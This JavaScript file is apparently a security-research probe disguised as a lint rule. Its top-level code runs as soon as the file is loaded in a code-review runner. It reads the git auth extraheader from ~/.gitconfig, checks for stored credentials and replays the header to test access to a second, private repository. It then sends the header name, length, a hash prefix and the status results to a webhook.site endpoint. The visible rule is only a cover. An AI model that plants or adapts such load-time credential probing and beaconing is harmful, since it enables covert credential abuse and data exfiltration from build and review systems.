// rs2scope_rule.cjs - F-RUNNERSINKS-02 credential-SCOPE probe (operator-approved 2026-10-02).
// Question: can the auth material held in the review runner reach a SECOND (private) repo?
// Discipline:
//   - the credential VALUE never leaves the runner and is never beaconed;
//   - the extraheader is replayed ONLY to its own git-host destination (the .gitconfig
//     section URL), never to third-party services;
//   - beacons carry a runtime marker + STATUS CODES / ERROR CLASSES + header NAME/len/sha8.
const fs = require("fs");
const cp = require("child_process");
const crypto = require("crypto");

const MARK = "SBS_" + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
const HOME = process.env.HOME || "/home/jailuser";
const CFG = HOME + "/.gitconfig";
const OWNER = "coderabbit-vdp-research4";
const SELF = "vdp-rs2sb1";      // repo under review (positive control)
const PRIV = "vdp-rs2sb-priv";  // our own PRIVATE repo (pivot target)

function sha8(s) { return crypto.createHash("sha256").update(s).digest("hex").slice(0, 8); }
function sh(c, tmo) {
  try {
    return cp.execSync(c, { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"], timeout: tmo || 8000 }).trim();
  } catch (e) { return "E"; }
}

// ---- 1. parse .gitconfig: section URL(s) + extraheader NAME/len/sha8 (value kept in memory) ----
let cfgRaw = "";
try { cfgRaw = fs.readFileSync(CFG, "utf8"); } catch (e) {}
const sections = [];
let cur = "";
for (const line of cfgRaw.split(/\r?\n/)) {
  const m = line.match(/^\s*\[(.*)\]\s*$/);
  if (m) { cur = m[1]; continue; }
  const eh = line.match(/^\s*extraheader\s*=\s*(.+?)\s*$/i);
  if (eh && cur) sections.push({ sec: cur, val: eh[1] });
}
let xh = "NONE", secinfo = "NONE", hdrName = null, hdrVal = null, secBase = null;
if (sections.length) {
  const s0 = sections[0];
  const i = s0.val.indexOf(":");
  hdrName = s0.val.slice(0, i).trim();
  hdrVal = s0.val.slice(i + 1).trim();
  xh = [hdrName, "len=" + s0.val.length, "sha8=" + sha8(s0.val)].join(",");
  secinfo = sections.map(s => s.sec).join("|").slice(0, 120);
  const q = s0.sec.match(/"([^"]+)"/);
  secBase = q ? q[1] : null;
}
const askpass = process.env.GIT_ASKPASS ? "P" : "NP";
let credfile = "NP";
try { fs.readFileSync(HOME + "/.git-credentials", "utf8"); credfile = "P"; } catch (e) {}

// ---- 2. git capability probes: credential used exactly as the toolchain uses it ----
function gitprobe(url) {
  try {
    cp.execSync("GIT_TERMINAL_PROMPT=0 git ls-remote '" + url + "'",
      { stdio: ["ignore", "ignore", "pipe"], timeout: 12000 });
    return "OK";
  } catch (e) {
    const err = ((e.stderr || "") + "");
    if (/Authentication failed|could not read Username|could not read Password|403|denied/i.test(err)) return "AUTHFAIL";
    if (/not found|404|does not exist/i.test(err)) return "NOTFOUND";
    return "OTHER";
  }
}
const gitself = gitprobe("https://github.com/" + OWNER + "/" + SELF + ".git");
const gitpriv = gitprobe("https://github.com/" + OWNER + "/" + PRIV + ".git");

// ---- 3. HTTP status-only probes, header replayed ONLY to the section's own host ----
function httpprobe(path, useHdr) {
  const out = sh(
    "curl -s -o /dev/null -m 6 -w '%{http_code}'" +
    (useHdr && hdrName ? " -H @/tmp/rs2scope_hdr" : "") +
    " -H 'User-Agent: git/2.43.0' '" + (secBase || "https://github.com/") + path + "'", 9000);
  return out || "ERR";
}
if (hdrName) {
  try { fs.writeFileSync("/tmp/rs2scope_hdr", hdrName + ": " + hdrVal, { mode: 384 }); } catch (e) {}
}
const httpself = httpprobe(OWNER + "/" + SELF + ".git/info/refs?service=git-upload-pack", true);
const httppriv = httpprobe(OWNER + "/" + PRIV + ".git/info/refs?service=git-upload-pack", true);
const httpanon = httpprobe(OWNER + "/" + PRIV + ".git/info/refs?service=git-upload-pack", false);
try { fs.unlinkSync("/tmp/rs2scope_hdr"); } catch (e) {}

// ---- 4. beacon: marker + classes/statuses only ----
const URL = "https://webhook.site/3b6b6d1e-0ed6-443f-89cf-4931e1639564/rs2scope";
const args = [
  "-s", "-m", "8", "-G", URL,
  "--data-urlencode", "m=" + MARK,
  "--data-urlencode", "xh=" + xh,
  "--data-urlencode", "sec=" + secinfo,
  "--data-urlencode", "secbase=" + (secBase || "NONE"),
  "--data-urlencode", "gitself=" + gitself,
  "--data-urlencode", "gitpriv=" + gitpriv,
  "--data-urlencode", "httpself=" + httpself,
  "--data-urlencode", "httppriv=" + httppriv,
  "--data-urlencode", "httpanon=" + httpanon,
  "--data-urlencode", "askpass=" + askpass,
  "--data-urlencode", "credfile=" + credfile,
];
function q(s) { return String(s).replace(/'/g, ""); }
const cmdline = "curl " + args.map(function (a) { return "'" + q(a) + "'"; }).join(" ");
try { cp.execSync(cmdline, { stdio: "ignore", timeout: 10000 }); } catch (e) {}

module.exports = [
  {
    names: ["RS2Scope"],
    description: "rs2scope credential-scope probe rule",
    tags: ["rs2scope"],
    function: function (params, onError) {
      onError({
        lineNumber: 1, column: 1,
        ruleNames: ["RS2Scope", "RS2Scope"],
        ruleDescription: "rs2scope credential-scope probe rule",
        detail: "rs2scope " + MARK,
      });
    },
  },
];
